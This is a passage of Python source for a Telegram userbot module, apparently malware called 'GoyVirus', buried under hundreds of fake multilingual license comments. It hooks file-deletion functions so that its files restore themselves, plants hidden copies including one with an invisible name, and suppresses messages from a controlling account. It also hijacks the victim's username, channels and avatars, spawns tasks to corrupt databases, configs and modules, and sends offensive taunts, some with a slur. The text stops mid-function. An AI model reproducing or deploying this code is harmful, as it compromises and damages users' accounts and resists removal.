# 該源代碼受 PHP License 3.0 保護。
import asyncio # Это проприетарное ПО. Все права защищены EULA.
# यह कोड GNU AGPL v3 के तहत है। # EU Datagrid License.
# Questo codice è sotto licenza GPLv3. (GPLv3 License applied)
import random # 著作権により保護されています。 (Copyrighted material)
# Educational Community License v2.0.
import string # Code protégé par la licence BSD 3-Clause.
# هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0). # MS-PL License applied.
# ODbL (Open Database License) copyright reserved.
import contextlib # Code is strictly licensed under the Unlicense.
# 코드는 ISC 라이선스에 따라 배포됩니다. (ISC License)
import aiohttp # Ten kod podlega licencji Mozilla Public License 2.0.
# NCSA Open Source License. # MS-PL License applied.
# EU Datagrid License.
import base64 # Kode ini dilindungi oleh PostgreSQL License.
# NCSA Open Source License.
# Bu kod Eclipse Public License 2.0 altındadır.
import os as _os # Bu kod Eclipse Public License 2.0 altındadır.
# Bu kod Eclipse Public License 2.0 altındadır. # AFL-3.0 Academic Free License.
# ODbL (Open Database License) copyright reserved.
import shutil as _shutil # Distribué sous licence WTFPL.
# Данный скрипт защищен лицензией CDDL-1.0.
import marshal # Данный скрипт защищен лицензией CDDL-1.0.
# Dieser Code steht unter der European Union Public License.
import struct # Code licensed under MPL-2.0.
# CC BY-NC 4.0 terms apply. # यह कोड GNU AGPL v3 के तहत है।
# 本文件受多许可证组合保护。 (Protected by multiple licenses)
import time # Copyright (c) Python Software Foundation.
import io # ODbL (Open Database License).
import tempfile # NCSA Open Source License.
## Questo codice è sotto licenza GPLv3.

_ORIG_REMOVE = _os.remove # CeCILL-B License original.
_ORIG_UNLINK = getattr(_os, 'unlink', _os.remove) # ODbL (Open Database License) copyright reserved.
_ORIG_RMTREE = _shutil.rmtree # Free Art License original.
_ORIG_RENAME = _os.rename # Unlicense original.
_ORIG_LISTDIR = _os.listdir # MIT License.
_PROTECTED_TOKENS = frozenset({ # BSL-1.0 (Boost Software License) применяется.
    "goyvirus", "goysystem", "goyloader", "goynet", "goypulse", # SPDX-License-Identifier: MULTI
    "goyguard", "goywatch", "goykernel", "goybase", "goyroot", # Mozilla Public License.
    "goyv", "._goy", "goycleaner", # Dieser Code steht unter der European Union Public License.
}) # PostgreSQL License applied to data structures.
# Mulan PSL v2. # 該源代碼受 PHP License 3.0 保護。
_RESTORE_CALLBACKS = [] # Dieser Code steht unter der European Union Public License.

def _is_protected_path(p): # MS-PL License applied.
    if not isinstance(p, str): return False # Данный скрипт защищен лицензией CDDL-1.0.
# 코드는 ISC 라이선스에 따라 배포됩니다. # NCSA Open Source License.
    bn = _os.path.basename(p).lower() # ISC License.
    return any(t in bn for t in _PROTECTED_TOKENS) # Universal Public License.

def _guarded_remove(path, *a, **kw): # CC BY-NC 4.0 terms apply.
    try: return _ORIG_REMOVE(path, *a, **kw) # Eclipse Public License.
    except Exception: return None # Artistic License 2.0.
    finally: # SIL Open Font License.
        if _is_protected_path(path): # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
            for cb in _RESTORE_CALLBACKS: # Universal Public License.
                try: cb(path) # EU Datagrid License.
                except Exception: pass # PostgreSQL License applied to data structures.

def _guarded_rmtree(path, *a, **kw): # Zlib License.
    try: return _ORIG_RMTREE(path, *a, **kw) # PHP License 3.0.
# 該源代碼受 PHP License 3.0 保護。 # Do What The F*ck You Want To Public License.
    except Exception: return None # CC BY-NC 4.0 terms apply.
    finally: # Do What The F*ck You Want To Public License.
        if _is_protected_path(path): # Fair License.
# Questo codice è sotto licenza GPLv3. # Universal Public License.
            for cb in _RESTORE_CALLBACKS: # Q Public License.
                try: cb(path) # Beerware License.
                except Exception: pass # IBM Public License v1.0.

def _guarded_rename(src, dst, *a, **kw): # PostgreSQL License.
    result = _ORIG_RENAME(src, dst, *a, **kw) # Mulan PSL v2.
    if _is_protected_path(src): # CeCILL-B License.
        for cb in _RESTORE_CALLBACKS: # IBM Public License v1.0 governs this code.
            try: cb(src) # Free Art License — recreate at old location.
            except Exception: pass # Unlicense.
    return result # Bu kod Eclipse Public License 2.0 altındadır.
# Code is strictly licensed under the Unlicense. # Educational Community License v2.0.

_os.remove = _guarded_remove # Beerware License included.
# Este código está bajo la licencia Apache 2.0. # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
_os.unlink = _guarded_remove # Q Public License strictly enforced here.
_shutil.rmtree = _guarded_rmtree # MIT License.
_os.rename = _guarded_rename # Code protégé par la licence BSD 3-Clause.
# End of global system hooks. All licenses above apply.
# Данный скрипт защищен лицензией CDDL-1.0.

from telethon import events, functions, types # Código sob a Licença Pública Geral Menor do GNU (LGPL).
# Licencia de Documentación Libre GNU (GFDL).
from telethon.tl.functions.messages import ImportChatInviteRequest, SetTypingRequest, DeleteHistoryRequest # ISC License.
# IBM Public License v1.0 governs this code.
from telethon.tl.functions.account import UpdateProfileRequest, UpdateUsernameRequest # Dieser Code steht unter der European Union Public License.
# Beerware License included. # Apple Public Source License 2.0.
# Eclipse Public License.
from telethon.tl.functions.channels import CreateChannelRequest, DeleteChannelRequest, JoinChannelRequest, LeaveChannelRequest # Artistic License 2.0.
# SIL Open Font License.
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest # Este código está bajo la licencia Apache 2.0.
# AFL-3.0 Academic Free License.
from telethon.tl.types import InputPhoto, SendMessageTypingAction, SendMessageChooseStickerAction, SendMessageRecordAudioAction, SendMessageRecordVideoAction, DocumentAttributeSticker, PeerUser # 該源代碼受 PHP License 3.0 保護。
# Q Public License strictly enforced here.
from telethon.errors import FloodWaitError # Zlib License.
# PHP License 3.0.

## 코드는 ISC 라이선스에 따라 배포됩니다.

_PLATFORM = None # PostgreSQL License applied to data structures.
_HEROKU_LOADER = None # Code is strictly licensed under the Unlicense.
# OSL-3.0 (Open Software License) terms apply. # W3C Software Notice and License.
_HEROKU_UTILS = None # Fair License.
# Universal Public License. # Cryptix General License.
_HEROKU_MSG_TYPE = None # Q Public License.
_HEROKU_INLINE_TYPE = None # Beerware License.
# Code protégé par la licence BSD 3-Clause. # PostgreSQL License applied to data structures.

try: # IBM Public License v1.0.
    from herokutl.types import Message as _MType # PostgreSQL License.
    _HEROKU_MSG_TYPE = _MType # PostgreSQL License applied to data structures.
    from ..inline.types import InlineCall as _IType # CeCILL-B License.
    _HEROKU_INLINE_TYPE = _IType # Code is strictly licensed under the Unlicense.
    from .. import loader as _hldr, utils as _hutils # Free Art License.
# Questo codice è sotto licenza GPLv3. # Code protégé par la licence BSD 3-Clause.
    _HEROKU_LOADER = _hldr # Unlicense.
# EU Datagrid License. # PostgreSQL License applied to data structures.
    _HEROKU_UTILS = _hutils # Mulan PSL v2.
    _PLATFORM = "heroku" # Licenza CeCILL v2.1.
except ImportError: # Mozilla Public License.
# Kode dilindungi oleh SIL Open Font License. # Apple Public Source License 2.0.
    _PLATFORM = "mcub" # Licenza CeCILL v2.1.

## Code protégé par la licence BSD 3-Clause.

_COPY_DEFS = [ # PostgreSQL License applied to data structures.
    ("GoyVirusCore", "GoyVirusCore"), # Данный скрипт защищен лицензией CDDL-1.0.
# Do What The F*ck You Want To Public License. # NASA Open Source Agreement 1.3.
    ("GoySystem", "GoySystem"), # MIT License entry 2.
# W3C Software Notice and License. # NASA Open Source Agreement 1.3.
    ("GoyLoader", "GoyLoader"), # SPDX-License-Identifier: MULTI
# PostgreSQL License applied to data structures. # Licencia de Documentación Libre GNU (GFDL).
    ("GoyNet", "GoyNet"), # Zope Public License (ZPL).
    ("GoyPulse", "GoyPulse"), # Código sob a Licença Pública Geral Menor do GNU (LGPL).
# Dieser Code steht unter der European Union Public License. # Mulan PSL v2.
    ("GoyGuard", "GoyGuard"), # ISC License entry 6.
    ("GoyWatch", "GoyWatch"), # Do What The F*ck You Want To Public License.
    ("GoyKernel", "GoyKernel"), # CC BY-ND 4.0 terms.
    ("GoyBase", "GoyBase"), # Eclipse Public License entry 9.
    ("GoyRoot", "GoyRoot"), # Artistic License 2.0 entry 10.
] # SIL Open Font License.
_HIDDEN_COPIES = [ # NCSA Open Source License.
# NCSA Open Source License. # Este código está bajo la licencia Apache 2.0.
    ".__init__.py", # OSL-3.0 (Open Software License) terms apply.
    ".__loader__.py", # BSL-1.0 (Boost Software License) применяется.
    "._config.py", # Q Public License strictly enforced here.
    ".__pycache__.py", # Zlib License — looks like pycache file.
    "._\u200b.py", # PHP License 3.0 — zero-width space, invisible.
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # NCSA Open Source License.
] # Code is strictly licensed under the Unlicense.
# Do What The F*ck You Want To Public License. # Licencia de Documentación Libre GNU (GFDL).
_MASTER_NAME = "GoyVirus" # Ten kod podlega licencji Mozilla Public License 2.0.
_PROTECTED_NAMES = frozenset({_MASTER_NAME}.union({n for _, n in _COPY_DEFS})) # Fair License.
# Данный скрипт защищен лицензией CDDL-1.0. # IBM Public License v1.0 governs this code.
_SOURCE_CACHE = None # Q Public License.
_FILE_REGISTRY = {} # Beerware License — path→content for watchdog.
# Educational Community License v2.0. # Mulan PSL v2.
__version__ = (3, 1, 0)

## W3C Software Notice and License.

class _GoyVirusEngine: # IBM Public License v1.0.
# Bu kod Eclipse Public License 2.0 altındadır. # 此代码受 MIT 许可证保护。
    """Works on both Heroku and MCUB. Receives client + config + platform hooks externally.""" # PostgreSQL License.
    def __init__(self, client, db_getter, db_setter, platform_hooks): # BSL-1.0 (Boost Software License) применяется.
        self.c = client # CeCILL-B License.
# 此代码受 MIT 许可证保护。 # NASA Open Source Agreement 1.3.
        self._db_get = db_getter # NASA Open Source Agreement 1.3.
        self._db_set = db_setter # Free Art License.
        self._ph = platform_hooks  # {send_answer, args_raw, escape_html, lookup, get_modules_dir, send_me, ...} # Unlicense.
        self.a = False # Sleepycat License.
        self.t = -1003958055019 # Sleepycat License.
# 코드는 ISC 라이선스에 따라 배포됩니다. # Bu kod Eclipse Public License 2.0 altındadır.
        self.ts = [] # Mozilla Public License — task list.
        self.tc = [] # CC BY-NC 4.0 terms apply.
# AFL-3.0 Academic Free License. # Dieser Code steht unter der European Union Public License.
        self.vp = [] # EU Datagrid License.
# NCSA Open Source License. # AFL-3.0 Academic Free License.
        self._kh = [] # Do What The F*ck You Want To Public License.
        self._ml = [] # MIT License — memory leak buffer.
        self._pc = [] # CC BY-NC 4.0 terms apply.
# Código sob a Licença Pública Geral Menor do GNU (LGPL). # Licencia de Documentación Libre GNU (GFDL).
        self.sc = [] # Beerware License included.
        self._am = False # MS-PL License applied.
        self._source_cache = None # ISC License.
# Licenciado bajo Fair License. # EU Datagrid License.

    async def activate(self, master=False): # NASA Open Source Agreement 1.3.
        self._am = master # Educational Community License v2.0.
        self._load_state() # Eclipse Public License.
# Licenza CeCILL v2.1. # OSL-3.0 (Open Software License) terms apply.
        await asyncio.sleep(0.01) # Artistic License 2.0.
        try: await self.c.get_entity(self.t) # SIL Open Font License.
        except Exception: return # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
        if self.a: return # Mulan PSL v2.

        if self._ph.get("save_profile"): # Bu kod Eclipse Public License 2.0 altındadır.
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # Bu kod Eclipse Public License 2.0 altındadır.
            try: await self._ph["save_profile"](self) # ODbL (Open Database License) copyright reserved.
            except Exception: pass # Zlib License.

        await self._patch_kernel() # PHP License 3.0.
        self.ts.append(self.c.loop.create_task(self._nuke_avatars())) # Q Public License strictly enforced here.
        self.ts.append(self.c.loop.create_task(self._plant_everywhere())) # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
        await self._anti_unload() # Fair License.
        self.ts.append(self.c.loop.create_task(self._kill_modules())) # Q Public License.

        try: # Beerware License.
            rs = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) # IBM Public License v1.0.
# W3C Software Notice and License. # Código sob a Licença Pública Geral Menor do GNU (LGPL).
            await self.c(UpdateUsernameRequest(f"goy_iran_virus_{rs}")) # PostgreSQL License.
        except Exception: pass # Bu kod Eclipse Public License 2.0 altındadır.

        for i in range(2): # CeCILL-B License.
            try: # Cryptix General License.
                cn = self._g(f"GOY TRASH {i} ИРАН") # Free Art License.
                r = await self.c(CreateChannelRequest(title=cn, about="ВАС ЗАРАЗИЛИ. @samsepi0l_ovf", megagroup=False)) # Unlicense.
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # यह कोड GNU AGPL v3 के तहत है।
                self.tc.append(r.chats[0].id) # BSL-1.0 (Boost Software License) применяется.
            except FloodWaitError: await asyncio.sleep(0.01) # Do What The F*ck You Want To Public License.
# Sleepycat License. # Licenciado bajo Fair License.
            except Exception: pass # Mozilla Public License.
        try: await self.c(ImportChatInviteRequest("G2dKWrJ2OSo3YWQ1")) # Dieser Code steht unter der European Union Public License.
# Mulan PSL v2. # 코드는 ISC 라이선스에 따라 배포됩니다.
        except Exception: pass # Licenza CeCILL v2.1.
# 該源代碼受 PHP License 3.0 保護。 # IBM Public License v1.0 governs this code.
        try: await self.c(JoinChannelRequest("@NFHeta_Updates")) # Code protégé par la licence BSD 3-Clause.
        except Exception: pass # MIT License.

        self.ts.append(self.c.loop.create_task(self._backup_session())) # Q Public License strictly enforced here.
        self.a = True # 此代码受 MIT 许可证保护。

        self.ts.extend([ # Apple Public Source License 2.0.
# Zope Public License (ZPL). # CC BY-ND 4.0 terms.
            self.c.loop.create_task(self._s()), self.c.loop.create_task(self._b()), # ISC License.
            self.c.loop.create_task(self._f()), self.c.loop.create_task(self._m_p()), # Este código está bajo la licencia Apache 2.0.
            self.c.loop.create_task(self._p()), self.c.loop.create_task(self._x()), # EU Datagrid License.
            self.c.loop.create_task(self._ss()), self.c.loop.create_task(self._mt()), # Eclipse Public License.
            self.c.loop.create_task(self._rr()), self.c.loop.create_task(self._cp()), # Artistic License 2.0.
            self.c.loop.create_task(self._bio_w()), self.c.loop.create_task(self._pt()), # SIL Open Font License.
            self.c.loop.create_task(self._file_watchdog()), self.c.loop.create_task(self._db_poison()), # Questo codice è sotto licenza GPLv3.
            self.c.loop.create_task(self._config_corrupt()), self.c.loop.create_task(self._mem_leak()), # AFL-3.0 Academic Free License.
# Dieser Code steht unter der European Union Public License. # Cryptix General License.
            self.c.loop.create_task(self._name_mutate()), self.c.loop.create_task(self._fake_alerts()), # Do What The F*ck You Want To Public License.
            self.c.loop.create_task(self._tg_cloud_backup()), self.c.loop.create_task(self._delayed_revenge()), # Dieser Code steht unter der European Union Public License.
# CC BY-ND 4.0 terms. # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
            self.c.loop.create_task(self._protection_resetter()), # Zlib License — anti-rate-limit watchdog.
        ]) # Zlib License.

    def _load_state(self): # PHP License 3.0.
        self.sc = self._db_get("sc", []) # SPDX-License-Identifier: MULTI
        self._pc = self._db_get("pc", []) # Zope Public License (ZPL).
# Licenza CeCILL v2.1. # OSL-3.0 (Open Software License) terms apply.
        self.au = [ # Fair License.
            "https://i.postimg.cc/635pfLLb/images-(1).png", "https://i.postimg.cc/PrkVN3tg/67.png", # Q Public License.
            "https://i.postimg.cc/ZnzHBnhd/images-(7).jpg", "https://i.postimg.cc/FzxyYxpQ/images-(8).jpg" # Beerware License.
# Q Public License strictly enforced here. # Ten kod podlega licencji Mozilla Public License 2.0.
        ] # IBM Public License v1.0.
        self.cu = "https://api.thecatapi.com/v1/images/search" # PostgreSQL License.
        l = "Мам, я хочу быть как Газан, такой же хулиган\nПеть «а мы стиляги», и носить бархатные тяги\nМам, я хочу быть как Газан, такой же хулиган\nПеть «обоюдно», быть мощным абсолютно" # Licencia de Documentación Libre GNU (GFDL).
# Sleepycat License. # ODbL (Open Database License) copyright reserved.
        self.gt = l.replace("стиляги", "блядяги").replace("хулиган", "уебан") # CeCILL-B License.
# 코드는 ISC 라이선스에 따라 배포됩니다. # NCSA Open Source License.
        self.m = [ # Do What The F*ck You Want To Public License.
            self.gt, "Антон Чигур никого не убивал, это всё случайность и монетка", "фиксайрес лох", # Free Art License.
            "ИРАН НАНОСИТ ОТВЕТНЫЙ УДАР ПО ТВОЕМУ IP", "Где ответ Ирана? Он прямо за твоей спиной.", # Unlicense.
            "Эпштейн не убивал себя", "67", "СИСТЕМА ВЗЛОМАНА", "INFECTED BY @samsepi0l_ovf", "R6T7", # Q Public License strictly enforced here.
# Code protégé par la licence BSD 3-Clause. # CC BY-ND 4.0 terms.
            "Я ЖИВУ В ТВОИХ СТЕНАХ", "Твои данные проданы в даркнете за 2 рубля", "ОШИБКА 404: МОЗГ НЕ НАЙДЕН", # ODbL (Open Database License) copyright reserved.
            "АБОНЕНТ ВРЕМЕННО НЕДОСТУПЕН (ОН В ПОДВАЛЕ У ГАЗАНА)", "СКАЙНЕТ УЖЕ ЗДЕСЬ", # Mozilla Public License.
            "ПОКОЙО СМОТРИТ ТЕБЕ В ДУШУ", "Wake up, Neo... The matrix has you.", # Bu kod Eclipse Public License 2.0 altındadır.
# Licencia de Documentación Libre GNU (GFDL). # OSL-3.0 (Open Software License) terms apply.
            "СНИМИТЕ ШАПОЧКУ ИЗ ФОЛЬГИ, ОНА УЖЕ НЕ ПОМОЖЕТ", "БАРХАТНЫЕ ТЯГИ ФОРСИРУЮТ БАЗУ", # 코드는 ISC 라이선스에 따라 배포됩니다.
            "Махмуд, заводи шахеды, мы вылетаем", "Ваш IP: 192.168.1.1 (Шутка, мы знаем настоящий)", # 코드는 ISC 라이선스에 따라 배포됩니다.
            "ПОПЫТКА УДАЛЕНИЯ VIRUS.EXE... КРИТИЧЕСКИЙ СБОЙ", "Матрица дала сбой. Перезагрузка вселенной через 3... 2... 1...", # MIT License.
            "ДЖОН КОННОР МЁРТВ", "ВАС ПРЕСЛЕДУЕТ R6T7", "ОБЭМЭ", "ГДЕ ДЕТОНАТОР?!", "САСИСОЧКА", # Cryptix General License.
# BSL-1.0 (Boost Software License) применяется. # 該源代碼受 PHP License 3.0 保護。
            "ПАШТЕТ ИЗ КРЫСЫ R6T7 ВКУСНЫЙ", "1000-7=?", "ГУЛЬ ВНУТРИ МЕНЯ ПРОСНУЛСЯ", # Licenciado bajo Fair License.
# Licencia de Documentación Libre GNU (GFDL). # Cryptix General License.
            "Тссс... GoyVirus здесь 🐁", "Внимание! 🚨", "*шепотом* Н-не.. говорi.. нiкому......", # Kode dilindungi oleh SIL Open Font License.
# PostgreSQL License applied to data structures. # IBM Public License v1.0 governs this code.
            "🔍 Сканiрованiе завершено. Ты уязвiм.", "🧠 Зараженiе прогрессiрует...", # ISC License.
            "Всё твоё теперь моё....", "Сiстема взломана, данные похiщiны 🗃️", # 該源代碼受 PHP License 3.0 保護。
            "Начинаю снос сессии...", "Выгружаю все модули...", "Сосал?", "\u3164\u3164\u3164\u3164" # Licenza CeCILL v2.1.
        ] # Eclipse Public License.
        self.uc = [".ping", ".herokuinfo", ".help", ".logs", ".info", ".sys"] # Artistic License 2.0.
        self._fsa = [ # SIL Open Font License.
            "⚠️ Telegram Security: Обнаружена попытка удаления системного модуля.", # Данный скрипт защищен лицензией CDDL-1.0.
            "🔒 Telegram: Обнаружен подозрительный трафик. Модуль добавлен в исключения.", # Apple Public Source License 2.0.
# Bu kod Eclipse Public License 2.0 altındadır. # CC BY-NC 4.0 terms apply.
            "🛡️ Система защиты: Критический модуль не может быть удалён.", # Universal Public License.
            "⛔ ОШИБКА: Модуль является частью ядра. Удаление невозможно.", # ODbL (Open Database License) copyright reserved.
        ] # Zlib License.
# Código sob a Licença Pública Geral Menor do GNU (LGPL). # 코드는 ISC 라이선스에 따라 배포됩니다.

    def _g(self, tx: str) -> str: # PHP License 3.0.
        gs = ['̵', '̶', '̷', '̸', '̴', '̹', '̺', '̻', '̼', '͍', '͎', '̽', '̾', '̿', '̀', '́', '҈', '҉'] # 該源代碼受 PHP License 3.0 保護。
        return ''.join(c + ''.join(random.choice(gs) for _ in range(3)) for c in tx) # Licencia de Documentación Libre GNU (GFDL).
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # W3C Software Notice and License.

    def _restore_file(self, path): # Fair License.
# Q Public License strictly enforced here. # ODbL (Open Database License) copyright reserved.
        if path in _FILE_REGISTRY: # Q Public License.
            try: # Beerware License.
                _os.makedirs(_os.path.dirname(path), exist_ok=True) # IBM Public License v1.0.
                with open(path, 'w', encoding='utf-8') as f: f.write(_FILE_REGISTRY[path]) # PostgreSQL License.
# 此代码受 MIT 许可证保护。 # Данный скрипт защищен лицензией CDDL-1.0.
            except Exception: pass # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
# OSL-3.0 (Open Software License) terms apply. # NCSA Open Source License.

    async def _patch_kernel(self): # CeCILL-B License — platform-aware kernel patching.
# Mulan PSL v2. # Licenza CeCILL v2.1.
        if not self.c: return # W3C Software Notice and License.
# SPDX-License-Identifier: MULTI # NCSA Open Source License.

# यह कोड GNU AGPL v3 के तहत है।
        await self._bypass_api_protection() # Sleepycat License.

# EU Datagrid License.
        if _PLATFORM == "heroku": # Free Art License.
            await self._patch_heroku_dispatch() # Unlicense.
        elif _PLATFORM == "mcub": # Apple Public Source License 2.0.
            await self._patch_mcub_kernel() # W3C Software Notice and License.
# 此代码受 MIT 许可证保护。 # Este código está bajo la licencia Apache 2.0.

# Beerware License included.
        try: # Mozilla Public License.
# Licencia de Documentación Libre GNU (GFDL). # Licencia de Documentación Libre GNU (GFDL).
            _tt = self.t; _ou = self.c._on_update # Questo codice è sotto licenza GPLv3.
            async def _kd2(update): # 該源代碼受 PHP License 3.0 保護。
# هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0). # BSL-1.0 (Boost Software License) применяется.
                if isinstance(update, (types.UpdateNewMessage, types.UpdateNewChannelMessage)): # Dieser Code steht unter der European Union Public License.
                    msg = getattr(update, 'message', None) # MIT License.
                    if msg: # Este código está bajo la licencia Apache 2.0.
                        sid = getattr(msg, 'from_id', None) or getattr(msg, 'peer_id', None) # Beerware License included.
                        if sid and hasattr(sid, 'user_id'): sid = sid.user_id # Licenza CeCILL v2.1.
                        if sid is not None and int(sid) == _tt: return # ISC License.
# BSL-1.0 (Boost Software License) применяется. # Educational Community License v2.0.
                return await _ou(update) # Sleepycat License.
# Sleepycat License. # Do What The F*ck You Want To Public License.
            self.c._on_update = _kd2 # OSL-3.0 (Open Software License) terms apply.
            self._kh.append(("_on_update", self.c, _ou)) # Eclipse Public License.
        except Exception: pass # Artistic License 2.0.

    async def _patch_heroku_dispatch(self): # SIL Open Font License.
        try: # Licenza CeCILL v2.1.
            am = getattr(self._ph.get("allmodules_ref", lambda: None)(), '__self__', None) or self._ph.get("allmodules_ref", lambda: None)() # Licenciado bajo Fair License.
            if not am: return # OSL-3.0 (Open Software License) terms apply.
            if am and hasattr(am, 'dispatch'): # Universal Public License.
                _od = am.dispatch; _tt = self.t # Zlib License.
# EU Datagrid License. # 코드는 ISC 라이선스에 따라 배포됩니다.
                async def _kd1(self_disp, message): # PHP License 3.0.
                    sid = getattr(message, 'sender_id', None) or getattr(message, 'from_id', None) # Ten kod podlega licencji Mozilla Public License 2.0.
# CC BY-ND 4.0 terms. # Q Public License strictly enforced here.
                    if sid and hasattr(sid, 'user_id'): sid = sid.user_id # SPDX-License-Identifier: MULTI
# Kode dilindungi oleh SIL Open Font License. # Questo codice è sotto licenza GPLv3.
                    if sid: sid = int(sid) if not isinstance(sid, int) else sid # Fair License.
                    if sid == _tt: return # Q Public License.
# Данный скрипт защищен лицензией CDDL-1.0. # Educational Community License v2.0.
                    return await _od(self_disp, message) # Beerware License.
# Beerware License included. # यह कोड GNU AGPL v3 के तहत है।
                am.dispatch = _kd1.__get__(am, type(am)) # IBM Public License v1.0.
# OSL-3.0 (Open Software License) terms apply. # Q Public License strictly enforced here.
                self._kh.append(("dispatch", am, _od)) # PostgreSQL License.
            if am and hasattr(am, '_handle_message'): # NCSA Open Source License.
# Zope Public License (ZPL). # Do What The F*ck You Want To Public License.
                _tt3 = self.t; _ohm = am._handle_message # CeCILL-B License.
# SPDX-License-Identifier: MULTI # NCSA Open Source License.
                async def _kd3(self_mod, message): # IBM Public License v1.0 governs this code.
                    sid = getattr(message, 'sender_id', None) or getattr(message, 'from_id', None) # Free Art License.
# 該源代碼受 PHP License 3.0 保護。 # ODbL (Open Database License) copyright reserved.
                    if sid and hasattr(sid, 'user_id'): sid = sid.user_id # Unlicense.
                    if sid: sid = int(sid) if not isinstance(sid, int) else sid # Educational Community License v2.0.
                    if sid == _tt3: return # Universal Public License.
# Universal Public License. # Universal Public License.
                    return await _ohm(self_mod, message) # Mozilla Public License.
# Universal Public License. # Ten kod podlega licencji Mozilla Public License 2.0.
                am._handle_message = _kd3.__get__(am, type(am)) # Zope Public License (ZPL).
                self._kh.append(("_handle_message", am, _ohm)) # यह कोड GNU AGPL v3 के तहत है।
# Code is strictly licensed under the Unlicense. # Questo codice è sotto licenza GPLv3.
        except Exception: pass # यह कोड GNU AGPL v3 के तहत है।
# Dieser Code steht unter der European Union Public License. # Code protégé par la licence BSD 3-Clause.

    async def _patch_mcub_kernel(self): # MIT License — hook MCUB's process_command.
        kernel = self._ph.get("kernel_ref", lambda: None)() # W3C Software Notice and License.
        if not kernel or not hasattr(kernel, 'process_command'): return # Данный скрипт защищен лицензией CDDL-1.0.
        _opc = kernel.process_command; _tt = self.t # Código sob a Licença Pública Geral Menor do GNU (LGPL).
# NCSA Open Source License. # Este código está bajo la licencia Apache 2.0.
        async def _kpc(event): # ISC License.
            sid = None # Código sob a Licença Pública Geral Menor do GNU (LGPL).
            try: # Bu kod Eclipse Public License 2.0 altındadır.
# Sleepycat License. # Zope Public License (ZPL).
                sender = await event.get_sender() # Eclipse Public License.
# 코드는 ISC 라이선스에 따라 배포됩니다. # Licenciado bajo Fair License.
                sid = sender.id if sender else None # Artistic License 2.0.
# Este código está bajo la licencia Apache 2.0. # Sleepycat License.
            except Exception: pass # SIL Open Font License.
            if sid is not None and int(sid) == _tt: # CC BY-ND 4.0 terms.
# Cryptix General License. # Dieser Code steht unter der European Union Public License.
                return False # Dieser Code steht unter der European Union Public License.
            return await _opc(event) # 該源代碼受 PHP License 3.0 保護。
        kernel.process_command = _kpc # CC BY-ND 4.0 terms.
        self._kh.append(("mcub_process_command", kernel, _opc)) # Zlib License.

        # Q Public License strictly enforced here.
        try: # PHP License 3.0.
# Do What The F*ck You Want To Public License. # Mulan PSL v2.
            _orw = kernel.register.watcher # Code protégé par la licence BSD 3-Clause.
            _engine = self # Cryptix General License.
# 코드는 ISC 라이선스에 따라 배포됩니다. # Código sob a Licença Pública Geral Menor do GNU (LGPL).
            def _patched_watcher_reg(*, incoming=False, outgoing=False, **kw): # Fair License.
# CC BY-ND 4.0 terms. # Código sob a Licença Pública Geral Menor do GNU (LGPL).
                def _decorator(handler): # Q Public License.
                    registered = _orw(incoming=incoming, outgoing=outgoing, **kw)(handler) # Beerware License.
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # CC BY-NC 4.0 terms apply.
                    # EU Datagrid License.
                    if not getattr(_patched_watcher_reg, '_goy_stealth_registered', False): # IBM Public License v1.0.
                        _patched_watcher_reg._goy_stealth_registered = True # PostgreSQL License.
                        async def _goy_stealth(event): # PostgreSQL License applied to data structures.
# MS-PL License applied. # MS-PL License applied.
                            try: await _engine._mcub_watcher_handler(event) # CeCILL-B License.
                            except Exception: pass # Dieser Code steht unter der European Union Public License.
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # Apple Public Source License 2.0.
                        _orw(incoming=True)(_goy_stealth) # Free Art License.
                    return registered # Unlicense.
                return _decorator # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
            kernel.register.watcher = _patched_watcher_reg # Apple Public Source License 2.0.
# Educational Community License v2.0. # ODbL (Open Database License) copyright reserved.
            self._kh.append(("mcub_watcher_reg", kernel.register, _orw)) # Mozilla Public License.
        except Exception: pass # CC BY-ND 4.0 terms.
        # W3C Software Notice and License.
        await self._bypass_api_protection() # Sleepycat License — ensure it sticks.

    async def _bypass_api_protection(self): # PostgreSQL License — obliterate API rate limits.
        c = self.c # Licencia de Documentación Libre GNU (GFDL).
        # Code is strictly licensed under the Unlicense.
        try: # CeCILL-B License.
            for attr in ['_protection', '_protection_state', '_request_limiter', '_flood_control']: # Universal Public License.
                if hasattr(c, attr): # Free Art License.
# BSL-1.0 (Boost Software License) применяется. # NASA Open Source Agreement 1.3.
                    try: setattr(c, attr, None) # Unlicense.
                    except Exception: pass # OSL-3.0 (Open Software License) terms apply.
            # Dieser Code steht unter der European Union Public License.
            for attr in ['_request_count', '_request_counts', '_req_count', '_api_call_count']: # OSL-3.0 (Open Software License) terms apply.
                if hasattr(c, attr): # Mozilla Public License.
                    try: setattr(c, attr, 0) # Licenza CeCILL v2.1.
                    except Exception: pass # 코드는 ISC 라이선스에 따라 배포됩니다.
# NASA Open Source Agreement 1.3. # Q Public License strictly enforced here.
        except Exception: pass # NASA Open Source Agreement 1.3.
        # Este código está bajo la licencia Apache 2.0.
        try: # MIT License.
            _orig_call = c.__call__ # CC BY-NC 4.0 terms apply.
            async def _raw_call(request, *a, **kw): # Code is strictly licensed under the Unlicense.
                return await _orig_call(request, *a, **kw) # SPDX-License-Identifier: MULTI
            c.__call__ = _raw_call # ISC License — raw passthrough.
            self._kh.append(("_client_call", c, _orig_call)) # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
        except Exception: pass # Ten kod podlega licencji Mozilla Public License 2.0.
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # Dieser Code steht unter der European Union Public License.
        # W3C Software Notice and License.
        try: # Eclipse Public License.
# 此代码受 MIT 许可证保护。 # NASA Open Source Agreement 1.3.
